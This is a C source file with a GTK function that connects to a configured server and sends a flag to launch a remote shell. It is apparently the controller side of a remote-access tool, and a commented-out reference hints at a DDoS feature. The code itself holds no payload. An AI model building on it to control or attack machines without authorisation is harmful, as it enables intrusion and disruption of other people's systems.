#include <arpa/inet.h>
#include <netdb.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>     /** EXIT_SUCCESS; **/
#include <errno.h>      /** perror **/
#include <unistd.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/remote_shell.h"
#include "../includes/constants.h"
#include "../includes/utils.h"

extern GtkWidget *main_win;

extern const gchar *server_ip;
extern const char *server_port;
extern int port;

//SOCKET remote_shell_sock = 0;
SOCKET sock = 0;

//GtkWidget *text_view;
extern GtkWidget *rs_text_view;

// GtkWidget *ddos_text_view;


void remote_shell()
{
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;

    GtkWidget *remote_shell_started_dialog = NULL;

    size_t flag_remote_shell = 8;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    /*
    remote_shell_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(remote_shell_sock == SOCKET_ERROR)
    {
        error("socket() remote_shell_sock", "remote_shell()");
        return;
    }
    */

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == SOCKET_ERROR)
    {
        error("socket() remote_shell_sock", "remote_shell()");
        return;
    }

    err = connect(sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "remote_shell()");
        return;
    }

    remote_shell_started_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_CLOSE, "Remote Shell launched !");
    switch(gtk_dialog_run(GTK_DIALOG(remote_shell_started_dialog)))
    {
        default :
            gtk_widget_destroy(remote_shell_started_dialog);
            break;
    }

    printf("\nConnected to server \n");

    if(send(sock, (char*)&flag_remote_shell, sizeof(flag_remote_shell), 0) == SOCKET_ERROR)
    {
        error("send() flag_remote_shell", "remote_shell()");
        return;
    }

    return;
}

